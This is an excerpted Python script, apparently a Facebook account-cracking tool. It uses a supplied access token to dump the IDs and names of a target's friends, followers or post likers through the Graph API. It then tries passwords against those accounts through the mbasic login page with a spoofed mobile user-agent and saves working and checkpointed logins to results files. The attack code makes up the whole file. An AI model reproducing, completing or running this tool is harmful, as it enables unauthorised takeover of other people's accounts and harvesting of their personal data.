...
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;92m..  ', '\x1b[1;91m... ','\x1b[1;92m.   ', '\x1b[1;92m..  ', '\x1b[1;91m... ']
    for x in titik:
...
def azimvau():
    os.system('clear')
    banner()
    print("%s IF YOU DON'T KNOW HOW TO GET TOKEN SEAND MSG OUR PAGE (%sOPEN%s)")%(K,H,K)
    print("")
    nunu = raw_input('\n %s[%s?%s] TOKEN :%s ' % (N, M, N, H))
    if nunu in ('open', 'Open', 'OPEN'):
        raw_input('\n %s*%s PRESS ENTER ' % (O, N))
        os.system('xdg-open https://www.facebook.com/100466858653425')
        azimvau()
    try:
...
def mr_error():
    ...
    if innocent == '':
        ...
        try:
            ...
            print(" %s[%s#%s] ____________________________________________________________________________"%(N,O,N));time.sleep(2)
            ...
            for fuck in total:
            	nunu = fuck.replace("\n","")
                titid  = nunu.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;92m×\x1b[0m]\x1b[1;92m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] ____________________________________________________________________________"%(N,O,N))
...
def teman(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/me/friends?access_token=%s'%(nunu)).json()["data"]:
            ...
            w = random.choice(['\x1b[1;92m', '\x1b[1;91m', '\x1b[1;92m', '\x1b[1;94m', '\x1b[1;92m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;91m%s\033[0m] [\033[0;91m%s\033[0m] PROCESS DUMP ID...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)
        ...
        os.system('echo "____________________________________________________________________________" | lolcat -a -d 2 -8')
...
def publik(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(mravu,nunu)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;95m', '\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;98m', '\x1b[1;91m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;91m%s\033[0m] [\033[0;91m%s\033[0m] PROCESS DUMP ID...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)
...
def followers(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(mravu,nunu)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;94m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;95m', '\x1b[1;91m', '\x1b[0m'])
...
def postingan(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/%s/likes?access_token=%s'%(mravu,nunu)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;95m', '\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;96m', '\x1b[1;91m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;91m%s\033[0m] [\033[0;91m%s\033[0m] PROCESS DUMP ID...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)
...
class __crack__:
    ...
    def plerr(self):
        ...
        if ___axim_xau___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    def __axm__(uvarm=None): 
                        cin = raw_input('\n [*] METHOD : ')
                        if cin == '':
                            print "\n %s[%s×%s] DON'T EMPTY"%(N,M,N);self.__axm__()
                        elif cin == '1':
                    ...
                    print ' [%s2%s]. MBASIC METHOD (SLOW/BEST)'%(O,N)
            ...
            print ' [%s2%s]. method mbasic (slow/best)'%(O,N)
    ...
    def __mbasic__(self, user, __axm__):
        ...
        for pw in __axm__:
            ...
            try:
            	_nunu = open('rbcst_ua.txt', 'r').read()
            except (KeyError, IOError):
            	_nunu = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    ...
    def __pler__(self):
        axm = raw_input('\n [*] METHOD : ')
        if axm == '':
            print "\n %s[%s×%s] DON'T LEAVE IT EMPTY"%(N,M,N);self.__pler__()
        elif axm in ('1', '01'):
            print '\n [%s+%s] OK RESULTS ARE SAVED TO -> RESULTS/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] CP RESULTS ARE SAVED TO -> RESULTS/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA TO PAUSE THE CRACK PROCESS\n'%(M,N)
